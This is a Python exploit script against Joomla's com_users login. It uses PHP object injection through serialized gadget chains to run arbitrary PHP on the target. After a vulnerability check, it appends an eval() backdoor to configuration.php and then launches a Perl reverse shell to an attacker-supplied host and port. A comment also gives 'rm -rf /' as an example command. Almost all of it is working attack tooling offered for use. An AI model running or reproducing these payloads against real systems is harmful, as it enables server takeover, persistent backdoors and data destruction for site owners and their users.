#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import sys
import string
import random
import argparse
from termcolor import colored

PROXS = {'http':'127.0.0.1:8080'}
PROXS = {}

def random_string(stringLength):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(stringLength))


backdoor_param = random_string(50)

def print_info(str):
        print(colored("[*] " + str,"cyan"))

def print_ok(str):
        print(colored("[+] "+ str,"green"))

def print_error(str):
        print(colored("[-] "+ str,"red"))

def print_warning(str):
        print(colored("[!!] " + str,"yellow"))

def get_token(url, cook):
        token = ''
        resp = requests.get(url, cookies=cook, proxies = PROXS)
        html = BeautifulSoup(resp.text,'html.parser')
        # csrf token is the last input
        for v in html.find_all('input'):
                csrf = v
        csrf = csrf.get('name')
        return csrf


def get_error(url, cook):
        resp = requests.get(url, cookies = cook, proxies = PROXS)
        if 'Failed to decode session object' in resp.text:
                #print(resp.text)
                return False
        #print(resp.text)
        return True


def get_cook(url):
        resp = requests.get(url, proxies=PROXS)
        #print(resp.cookies)
        return resp.cookies


def gen_pay(function, command):
        # Generate the payload for call_user_func('FUNCTION','COMMAND')
        template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
        #payload =  command + ' || $a=\'http://wtf\';'
        payload =  'http://l4m3rz.l337/;' + command
        # Following payload will append an eval() at the enabled of the configuration file
        #payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'test\\\'])) eval($_POST[\\\'test\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
        function_len = len(function)
        final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
        return final

def make_req(url , object_payload):
        # just make a req with object
        print_info('Getting Session Cookie ..')
        cook = get_cook(url)
        print_info('Getting CSRF Token ..')
        csrf = get_token( url, cook)

        user_payload = '\\0\\0\\0' * 9
        padding = 'AAA' # It will land at this padding
        working_test_obj = 's:1:"A":O:18:"PHPObjectInjection":1:{s:6:"inject";s:10:"phpinfo();";}'
        clean_object = 'A";s:5:"field";s:10:"AAAAABBBBB' # working good without bad effects

        inj_object = '";'
        inj_object += object_payload
        inj_object += 's:6:"return";s:102:' # end the object with the 'return' part
        password_payload = padding + inj_object
        params = {
            'username': user_payload,
            'password': password_payload,
            'option':'com_users',
            'task':'user.login',
            csrf :'1'
            }

        print_info('Sending request ..')
        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)
        return resp.text

def get_backdoor_pay():
        # This payload will backdoor the the configuration .PHP with an eval on POST request

        function = 'assert'
        template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
        # payload =  command + ' || $a=\'http://wtf\';'
        # Following payload will append an eval() at the enabled of the configuration file
        payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'' + backdoor_param +'\\\'])) eval($_POST[\\\''+backdoor_param+'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
        function_len = len(function)
        final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
        return final

def check(url):
        check_string = random_string(20)
        target_url = url + 'index.php/component/users'
        html = make_req(url, gen_pay('print_r',check_string))
        if check_string in html:
                return True
        else:
                return False

def ping_backdoor(url,param_name):
        res = requests.post(url + '/configuration.php', data={param_name:'echo \'PWNED\';'}, proxies = PROXS)
        if 'PWNED' in res.text:
                return True
        return False

def execute_backdoor(url, payload_code):
        # Execute PHP code from the backdoor
        res = requests.post(url + '/configuration.php', data={backdoor_param:payload_code}, proxies = PROXS)
        print(res.text)

def exploit(url, lhost, lport):
        # Exploit the target
        # Default exploitation will append en eval function at the end of the configuration.pphp
        # as a bacdoor. btq if you do not want this use the funcction get_pay('php_function','parameters')
        # e.g. get_payload('system','rm -rf /')

        # First check that the backdoor has not been already implanted
        target_url = url + 'index.php/component/users'

        make_req(target_url, get_backdoor_pay())
        if ping_backdoor(url, backdoor_param):
                print_ok('Backdoor implanted, eval your code at ' + url + '/configuration.php in a POST with ' + backdoor_param)
                print_info('Now it\'s time to reverse, trying with a system + perl')
                execute_backdoor(url, 'system(\'perl -e \\\'use Socket;$i="'+ lhost +'";$p='+ str(lport) +';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\\\'\');')


if __name__ == '__main__':
        parser = argparse.ArgumentParser()
        parser.add_argument('-t','--target',required=True,help='Joomla Target')
        parser.add_argument('-c','--check', default=False, action='store_true', required=False,help='Check only')
        parser.add_argument('-e','--exploit',default=False,action='store_true',help='Check and exploit')
        parser.add_argument('-l','--lhost', required='--exploit' in sys.argv, help='Listener IP')
        parser.add_argument('-p','--lport', required='--exploit' in sys.argv, help='Listener port')
        args = vars(parser.parse_args())

        url = args['target']
        if(check(url)):
                print_ok('Vulnerable')
                if args['exploit']:
                        exploit(url, args['lhost'], args['lport'])
                else:
                        print_info('Use --exploit to exploit it')

        else:
                print_error('Seems NOT Vulnerable ;/')
